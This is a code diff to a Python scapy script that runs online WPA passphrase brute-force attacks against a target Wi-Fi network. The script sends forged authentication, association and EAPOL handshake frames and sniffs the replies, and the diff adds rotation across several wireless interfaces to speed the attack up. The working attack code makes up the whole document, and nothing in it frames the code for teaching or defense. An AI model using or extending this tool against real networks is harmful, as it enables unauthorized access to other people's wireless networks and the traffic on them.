@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 from scapy.all import *
-from threading import Thread
+from threading import Thread, Lock
 from time import sleep
 import hmac
 import hashlib
@@ -17,7 +17,7 @@ passwords = []
 found = None
 
 parser = argparse.ArgumentParser(description='WPA PSK bruteforce')
-parser.add_argument("-iface", type=str, metavar='iface',
+parser.add_argument("-iface", type=lambda s: s.split(','), metavar='iface',
                     default='wlan1', help="interface")
 parser.add_argument("-bssid", type=str, metavar='MAC', help="target BSSID")
 parser.add_argument("-essid", type=str, metavar='SSID', help="target ESSID")
@@ -33,8 +33,19 @@ parser.add_argument("-T", dest="timeout", type=int, default=15, help="timeout")
 parser.add_argument("-d", dest="debug", action="store_true",
                     default=False, help="show more info")
 args = parser.parse_args()
-conf.iface = args.iface
+conf.iface = args.iface[0]
 
+lock = Lock()
+cur_iface = 0
+ifaces_cnt = len(args.iface)
+def iface():
+    global cur_iface
+    global ifaces_cnt
+    with lock:
+        cur_iface = (cur_iface + 1) % ifaces_cnt
+        return args.iface[cur_iface]
+
+print(iface())
 
 class IEEE80211(Exception):
     pass
@@ -99,7 +110,7 @@ class Brute:
             return True
 
     def get_beacon(self):
-        sniff(iface=args.iface, lfilter=lambda p: p.haslayer(Dot11Beacon), stop_filter=self.handle_beacon,
+        sniff(iface=iface(), lfilter=lambda p: p.haslayer(Dot11Beacon), stop_filter=self.handle_beacon,
               timeout=self.TIMEOUT)
 
     def handle_authorization_response(self, p):
@@ -117,7 +128,7 @@ class Brute:
         return self.is_auth_found
 
     def get_authorization_response(self):
-        sniff(iface=args.iface, lfilter=lambda p: p.haslayer(Dot11Auth), stop_filter=self.handle_authorization_response,
+        sniff(iface=iface(), lfilter=lambda p: p.haslayer(Dot11Auth), stop_filter=self.handle_authorization_response,
               timeout=self.TIMEOUT)
 
     def handle_association_response(self, p):
@@ -135,7 +146,7 @@ class Brute:
         return self.is_assoc_found
 
     def get_association_response(self):
-        sniff(iface=args.iface, lfilter=lambda p: p.haslayer(Dot11AssoResp),
+        sniff(iface=iface(), lfilter=lambda p: p.haslayer(Dot11AssoResp),
               stop_filter=self.handle_association_response, timeout=self.TIMEOUT)
 
     def handle_m1(self, p):
@@ -155,7 +166,7 @@ class Brute:
             return True
 
     def get_m1(self):
-        sniff(iface=args.iface, lfilter=lambda p: p.haslayer(EAPOL),
+        sniff(iface=iface(), lfilter=lambda p: p.haslayer(EAPOL),
               stop_filter=self.handle_m1, timeout=self.TIMEOUT)
 
     def handle_m3(self, p):
@@ -173,7 +184,7 @@ class Brute:
             return True
 
     def get_m3(self):
-        sniff(iface=args.iface, lfilter=lambda p: p.haslayer(EAPOL),
+        sniff(iface=iface(), lfilter=lambda p: p.haslayer(EAPOL),
               stop_filter=self.handle_m3, timeout=self.TIMEOUT)
 
     def has_pmkid(self):
@@ -200,7 +211,7 @@ class Brute:
 
         Thread(target=self.get_authorization_response).start()
         sleep(0.01)
-        sendp(authorization_request, verbose=0)
+        sendp(authorization_request, verbose=0, iface=iface())
         wait = 0
         while not self.is_auth_found and wait < self.TIMEOUT:
             sleep(0.01)
@@ -231,7 +242,7 @@ class Brute:
         Thread(target=self.get_m1).start()
         Thread(target=self.get_m3).start()
         sleep(0.1)
-        sendp(association_request, verbose=0)
+        sendp(association_request, verbose=0, iface=iface())
         wait = 0
         while (not self.is_assoc_found or not self.anonce) and wait < self.TIMEOUT:
             sleep(0.01)
@@ -300,7 +311,7 @@ class Brute:
             / EAPOL(version=1, type=3, len=117) / bytes(eapol_data_4)
 
         m2 /= self.checksum(bytes(m2))
-        sendp(m2, verbose=0)
+        sendp(m2, verbose=0, iface=iface())
         wait = 0
         while not self.amic and wait < self.TIMEOUT:
             sleep(0.01)
